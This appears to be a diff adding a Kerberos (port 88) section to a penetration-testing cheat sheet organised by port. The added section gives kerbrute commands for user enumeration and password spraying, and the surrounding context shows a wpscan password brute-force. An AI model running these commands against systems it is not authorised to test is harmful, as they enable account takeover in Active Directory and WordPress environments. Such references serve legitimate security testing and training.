@@ -151,6 +151,20 @@ VRFY {username}
 wpscan --url http://10.0.0.1/ --passwords /usr/share/wordlists/rockyou.txt --usernames admin --api-token {token-api}
 ```
 
+## Port 88
+```
+Service : kerberos-sec  Microsoft Windows Kerberos
+
+# Install kerbrute : https://github.com/ropnop/kerbrute/releases
+# Think to add the domain to the /etc/host -> echo '@IP @domain' >> /etc/hosts (example echo '10.0.0.1 cyberlab.local' >> /etc/hosts)
+# Enumerate the user
+root@kali:~# kerbrute userenum -d <domain_name> --dc <dns_domain_name> userlist.txt -t 100
+
+# Password Spraying
+root@kali:~# ./kerbrute_linux_amd64 passwordspray -d <domain_name> domain-users.txt Password123
+```
+
+
 ## Port 110
 ## Port 111
 ```
